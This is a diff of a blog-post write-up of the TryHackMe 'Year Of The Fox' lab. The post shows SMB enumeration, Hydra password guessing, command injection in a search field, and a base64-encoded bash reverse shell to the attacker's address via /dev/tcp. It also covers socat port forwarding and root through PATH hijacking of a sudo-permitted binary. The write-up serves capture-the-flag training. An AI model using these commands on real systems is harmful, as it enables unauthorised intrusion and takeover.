@@ -1,8 +1,7 @@
 ---
-layout: post
 title: Year Of The Fox
-subtitle: New Year Series
-tags: [TryHackMe,Hard,New Year Series,Linux,Privilege Escalation,Reverse Shell,Sudoer File Misconfiguration]
+category: [writeups,TryHackMe]
+tags: [Linux,Privilege-Escalation,Reverse-Shell,Sudoer-File-Misconfiguration]
 ---
 # Year Of The Fox 
 - Difficulty : `Hard`
@@ -10,18 +9,9 @@ tags: [TryHackMe,Hard,New Year Series,Linux,Privilege Escalation,Reverse Shell,S
 - Operating System : `Linux`
 
 # Table of Content
-- [Rustscan result](#rustscan-result)
 - [Nmap Result](#nmap-result)
 - [Method to solve the challenge](#method-to-solve-the-challenge)
 - [Privilege Escalation](#privilege-escalation)
-- [Flag](#flag)
-
-## Rustscan result
-```
-Open 10.10.30.135:80
-Open 10.10.30.135:139
-Open 10.10.30.135:445
-```
 
 ## Nmap Result
 ```
@@ -85,7 +75,7 @@ Host script results:
 # Method to solve the challenge
 As usual the challenge will be starting with website after looking into nmap result. The website required us to login in order to proceed.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179440564-7a46d850-589e-4a10-b578-1131f836e48c.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-1.png)
 <br>
 Since we are do not have any username or password, we will proceed to the other services which is smb. We will be using `enum4linux` to scan and get information from smb.
 ```
@@ -112,15 +102,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-17 23:37:
 ```
 After trying with both username and random password from wordlist, username `rascal` have a password which allow him to login into the website. After login into the website and playing around, it seems that the search comand will print out the files. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179442315-90421c21-5d13-43be-a0fc-865af116fcf1.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-2.png)
 <br>
 The first idea when i saw this search feature is try to inject commands into the search feature.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179442542-9861d7f4-15c2-4e06-b288-8c6cbb127c70.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-3.png)
 <br>
 `pwd` command was managed to inject into the search feature an return other result. With this, we can confirmed that we are able to get a reverse shell from search feature. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179442759-5c39e505-02a7-4e95-a6f5-5876a2fbcc75.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-4.png)
 <br>
 After trying out to get a reverse shell, it failed as the serach function detected some invalid character. In order to avoid that, we will use `base64` to encode our reverse shell and decode it back in the search function
 ```
@@ -128,18 +118,23 @@ echo "bash -i >& /dev/tcp/10.6.105.254/1234 0>&1" | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjEwNS4yNTQvMTIzNCAwPiYxCg==
 ```
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179442980-0a96d093-42cb-4c61-a57b-f2722497d7d6.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-5.png)
 <br>
 We managed to get a reverse shell but it is a ugly shell and it is not a root account.
-![image](https://user-images.githubusercontent.com/88197307/179443106-41b5a0ef-d8e3-456a-b04f-8c4c0e84fd25.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-6.png)
 
 # Privilege Escalation
-Before starting to look for information to perform privilege escalation, we could always change the ugly shell to interactive shell with following command:<br>
-`python -c "import pty;pty.spawn('/bin/bash')"`<br>
-`export TERM=xterm`<br>
-`[ctrl]+[z] > stty raw echo; fg`
-<br>
+Before starting to look for information to perform privilege escalation, we could always change the ugly shell to interactive shell with following command:
+
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+[ctrl]+[z] > stty raw echo; fg
+
+```
+
 As for privilege escalation, we could always make use of `linpeas.sh` to look for suspicious information.
+
 ```
 tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
 tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
@@ -157,7 +152,9 @@ udp        0      0 10.10.30.135:138        0.0.0.0:*
 udp        0      0 0.0.0.0:138             0.0.0.0:*                          
 udp        0      0 127.0.0.53:53           0.0.0.0:* 
 ```
+
 Based on the information given, the only way that could continue is their localhost is running port 22. We might also have a chance to access their ssh if we could port forward the port. 
+
 ```
 ...
 #Port 22
@@ -167,15 +164,16 @@ ListenAddress 127.0.0.1
 ...
 AllowUsers fox
 ```
+
 After more investigation about port 22, it only allow localhost to connect with username `fox`. The only way to proceed now is either bruteforce directly from the reverse shell or forward port from localhost and let us have access from our machine. As for port forwarding, we could use a tool call [`socat`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
 <br>
 our machine: 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179444039-dbd0194b-d4b9-4ffa-8489-625d7186ef54.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-7.png)
 <br>
 Reverse Shell: 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179444131-9d4ab3f5-f94a-44db-a068-87896c01c71f.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-8.png)
 <br>
 We could start to port forward once `socat` has successfully sent into the victim machine.
 ```
@@ -217,7 +215,7 @@ fox@10.10.30.135's password:
 ```
 After getting the file, we could anaylze with any RE tools. I will be using a free GUI tool named `cutter`. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179446281-850243c3-d335-42a6-a854-72f5848ff5c8.png)
+![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-9.png)
 <br>
 After analying the whole file, there is some misconfiguration of the file as the `shutdown` will call `poweroff` but `sudoer` file did not provide absolute path which mean we could create of copy bash and rename it to `poweroff` and change the `path` to our fake `poweroff`.
 ```
@@ -229,22 +227,3 @@ root@year-of-the-fox:/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 We managed to get root account!!
-
-# Flag
-Web Flag:
-<br>
-![image](https://user-images.githubusercontent.com/88197307/179446763-12330c7b-831a-4cb6-ab25-0fb3d6fbe845.png)
-<br>
-User Flag:
-<br>
-![image](https://user-images.githubusercontent.com/88197307/179446824-38eb5c8f-906c-46fd-81c9-9185a55bb34b.png)
-<br>
-Root Flag:
-<br>
-![image](https://user-images.githubusercontent.com/88197307/179446890-e4b170d5-9d14-4f68-a63e-4cb4ea65a374.png)
-
-
-
-
-
-
